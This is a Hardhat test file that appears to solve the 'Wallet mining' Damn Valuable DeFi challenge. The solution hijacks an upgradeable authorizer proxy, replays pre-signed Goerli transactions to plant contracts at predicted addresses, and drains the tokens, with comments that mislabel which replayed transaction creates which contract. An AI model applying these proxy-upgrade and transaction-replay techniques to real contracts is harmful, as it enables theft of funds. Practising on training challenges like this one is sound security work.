const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');
const { raw_transactions } = require('./raw-transactions');

describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;
    
    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, ward, player ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [ [ ward.address ], [ DEPOSIT_ADDRESS ] ], // initialization data
            { kind: 'uups', initializer: 'init' }
        );
        
        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);
        
        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        //await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
        await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        // Factory address according with WalletDeployer contract, it's empty
        const FACTORY = "0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B".toLowerCase();
        // Master Copy address according with WalletDeployer contract, it's empty
        const COPY = "0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F".toLowerCase();
        // Looking on goerli.etherscan we see this address created both factory and copy
        // With the addresses we saw before
        const CREATOR = "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A".toLowerCase();

        // Deploy our contract
        hackWalletMining = await (await ethers.getContractFactory('HackWalletMining', player)).deploy(
            walletDeployer.address
        );
    
        // Make our HackWalletMining contract the AuthorizerUpgradeable v2
        // This AuthorizerUpgradeable is used by WalletDeployer to allow users to create a Proxy
        await authorizer.connect(deployer).upgradeTo(hackWalletMining.address);

        /*
            Once we have access to the WalletDeployer throught the authorizer
            We need to check how to put code inside the masterCopy, the factory and the deposit address
            When a contract address is created the EVM takes into account the deployer address and the nonce
            So we're going to check two addresses and nonces
        */
        const checkAddresses = (deployer, name) => {
            let _DEPLOYER_ = deployer.toLowerCase();
            for (let i = 0; i < 100; i++) {
                let deployedAddress = ethers.utils.getContractAddress({from: _DEPLOYER_, nonce: i}).toLowerCase();  
                // The creator of the factory is the CREATOR address as we saw it in etherscan
                // The nonce is 0
                if (deployedAddress == FACTORY) {
                    console.log({factory_address: deployedAddress, created_from: name, at_nonce: i})
                }
                // The creator of the factory is the CREATOR address as we saw it in etherscan
                // The nonce is 2
                if (deployedAddress == COPY) {
                    console.log({copy_address: deployedAddress, created_from: name, at_nonce: i})
                }
                // The creator of the deposit_address is the FACTORY
                // The nonce is 43
                if (deployedAddress == DEPOSIT_ADDRESS) {
                    console.log({deposit_address: deployedAddress, created_from: name, at_nonce: i})
                }
            }
        }

        // Execute the previous function twice
        checkAddresses(CREATOR, "creator");
        checkAddresses(FACTORY, "factory");

        // Once we know this we're going to take advantage that this contracts are already deployed in goerli
        // First we send some ETH to the CREATOR address so we can make some transactions
        await player.sendTransaction({to: CREATOR, value: ethers.utils.parseEther("10")});
        /*
            Tx id: 0x32773bcb9a23dcbf1e95a4020a8d4fe966a106c5c8f84c9a386fdb9b6b98f5fd
            Using this link we can get the raw transaction sent in goerli network
            https://goerli.etherscan.io/getRawTx?tx=0x32773bcb9a23dcbf1e95a4020a8d4fe966a106c5c8f84c9a386fdb9b6b98f5fd
            We're going to copy the raw transaction into a variable and send the transaction
            Because the transaction is already sign, we can send it
            This transaction creates the FACTORY
        */
        await ethers.provider.sendTransaction(raw_transactions.copy_creation);
        /*
            We don't care what does the Second transaction but we need it to reach nonce 2.
            Tx id: 0x0200f54bbba81975e06ffa43d1f78f2de5012c0c84571846396979f84cf3b014
            https://goerli.etherscan.io/getRawTx?tx=0x0200f54bbba81975e06ffa43d1f78f2de5012c0c84571846396979f84cf3b014
        */
        await ethers.provider.sendTransaction(raw_transactions.second_transaction);
        /*
            Tx id: 0xf4ceda617528ea6a2ee415b41b904bd00e31a782b2c1ba8c3262fff10d4075c6
            https://goerli.etherscan.io/getRawTx?tx=0xf4ceda617528ea6a2ee415b41b904bd00e31a782b2c1ba8c3262fff10d4075c6
            This transaction creates the COPY
        */
        await ethers.provider.sendTransaction(raw_transactions.factory_creation);
 
        // Once those addresses has code, we call our contract
        await hackWalletMining.connect(player).hack(player.address, token.address);
        
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x');

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq('0x');

        // Deposit account must have code
        expect(
            await ethers.provider.getCode(DEPOSIT_ADDRESS)
        ).to.not.eq('0x');
        
        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(
            await token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq(0);
        expect(
            await token.balanceOf(walletDeployer.address)
        ).to.eq(0);

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)); 
    });
});
